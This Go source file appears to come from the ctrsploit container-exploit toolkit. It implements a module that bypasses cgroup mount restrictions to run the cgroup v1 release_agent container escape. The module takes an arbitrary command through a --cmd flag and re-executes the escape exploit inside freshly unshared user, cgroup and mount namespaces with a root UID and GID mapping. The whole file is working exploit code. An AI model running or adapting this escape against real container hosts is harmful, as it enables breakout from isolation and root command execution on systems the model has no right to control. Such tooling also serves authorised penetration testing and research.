package cgroup_mount_bypass_cgroupv1_release_agent

import (
	"flag"
	cgroupv1_release_agent "github.com/ctrsploit/ctrsploit/exploit/cgroupv1-release_agent"
	cgroupv1_release_agent_unknown_rootfs "github.com/ctrsploit/ctrsploit/exploit/cgroupv1-release_agent-unknown_rootfs"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/docker/docker/pkg/reexec"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"golang.org/x/sys/unix"
	"os"
	"os/exec"
	"syscall"
)

func Exploit() {
	defer os.Exit(0)

	flagSet := flag.NewFlagSet(ExpName, flag.ContinueOnError)
	var debug, unknownRootfs bool
	var cmd string
	flagSet.BoolVar(&debug, "debug", false, "")
	flagSet.BoolVar(&unknownRootfs, "unknown_rootfs", false, "")
	flagSet.StringVar(&cmd, "cmd", "", "")
	awesome_error.CheckFatal(flagSet.Parse(os.Args[1:]))
	log.Logger.Debug("cmd: ", cmd)
	BypassCgroupMountReleaseAgent(cmd, debug, unknownRootfs)
}

func BypassCgroupMountReleaseAgent(cmd string, debug, unknownRootfs bool) {
	log.Logger.Debug("start")
	debugArg := "--debug"
	if !debug {
		debugArg += "=false"
	}
	var command *exec.Cmd
	if unknownRootfs {
		command = reexec.Command(cgroupv1_release_agent_unknown_rootfs.ExpName, debugArg, "--cmd", cmd)
	} else {
		command = reexec.Command(cgroupv1_release_agent.ExpName, debugArg, "--cmd", cmd)
	}
	log.Logger.Debug(command.Args)
	command.SysProcAttr = &syscall.SysProcAttr{
		//Cloneflags: unix.CLONE_NEWCGROUP | unix.CLONE_NEWUSER |
		//	unix.CLONE_NEWNS, // mnt ns
		// maybe need
		Credential: &syscall.Credential{
			Uid: 0,
			Gid: 0,
		},
		Unshareflags: unix.CLONE_NEWCGROUP | unix.CLONE_NEWUSER |
			unix.CLONE_NEWNS, // mnt ns
		UidMappings: []syscall.SysProcIDMap{
			{
				ContainerID: 0,
				HostID:      0,
				Size:        1,
			},
		},
		GidMappings: []syscall.SysProcIDMap{
			{
				ContainerID: 0,
				HostID:      0,
				Size:        1,
			},
		},
	}
	command.Stdout = os.Stdout
	command.Stderr = os.Stderr
	awesome_error.CheckFatal(command.Run())
	log.Logger.Debug("end")
	//cgroupv1_release_agent.ReleaseAgent(cmd)
}
